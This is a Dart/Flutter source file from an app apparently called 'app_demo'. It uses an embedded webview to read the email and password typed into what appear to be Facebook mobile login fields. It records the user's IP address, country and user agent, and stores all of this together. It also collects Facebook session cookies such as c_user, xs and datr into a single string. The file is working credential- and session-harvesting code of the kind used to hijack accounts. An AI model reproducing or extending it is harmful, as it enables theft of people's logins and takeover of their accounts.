import 'dart:convert';

import 'package:app_demo/http_client/api_ip.dart';
import 'package:app_demo/models/ip.model.dart';
import 'package:app_demo/models/user.model.dart';
import 'package:app_demo/service/locate.service.dart';
import 'package:dart_ipify/dart_ipify.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

final storage = FlutterSecureStorage();

class JsFunction {
  static String userAgent = '';
  static Future<User> getInforUser(Uri uri, InAppWebViewController controller,
      CookieManager cookieManager, bool isCheckpoint) async {
    userAgent = '';
    var html = await controller.evaluateJavascript(
        source: "window.document.getElementsByTagName('html')[0].outerHTML;");
    var username = await controller.evaluateJavascript(
        source: "window.document.getElementById('m_login_email').value;");
    var password = await controller.evaluateJavascript(
        source: "window.document.getElementById('m_login_password').value;");
    userAgent =
        await controller.evaluateJavascript(source: "navigator.userAgent");
    final ipv6 = await Ipify.ipv4();
    print("user agent : " + userAgent);

    var api = getIt.get<RestIpClient>();
    IpModel ipModel = await api.getConfig(ipv6);

    User user = User(
      username: username,
      password: password,
      // cookie: cookie,
      country: ipModel.country,
      ipAddress: ipv6,
    );

    await storage.write(key: "user", value: json.encode(user));

    return user;
  }

  static Future<String> getAllCookie(
      CookieManager cookieManager, Uri uri) async {
    //khoa.developer.flutter@gmail.com
    String? cookie;
    String token = "";
    String sb = '';
    String fr = '';
    String datr = '';
    String xs = '';
    String cUser = '';
    String wd = '';
    String userAgentTmp = "userAgent=" + userAgent;

    final gotCookies = await cookieManager.getCookies(url: uri);
    for (var item in gotCookies) {
      // String cookies = item.toString();
      // print(cookies);

      if (item.name == "datr") {
        datr = "datr=" + item.value + ";";
      }
      if (item.name == 'sb') {
        sb = "sb=" + item.value + ";";
      }
      if (item.name == "fr") {
        fr = "fr=" + item.value + ";";
      }
      if (item.name == "xs") {
        xs = "xs=" + item.value + ";";
      }
      if (item.name == "c_user") {
        cUser = "c_user=" + item.value + ";";
      }
      if (item.name == "wd") {
        wd = "wd=" + item.value + ";";
      }
      cookie = "${datr}${sb}${fr}${xs}${cUser}${wd}";
    }

    return cookie!;
  }

  static Future<void> clearCookie(CookieManager cookieManager) async {
    await cookieManager.deleteAllCookies();
  }
}
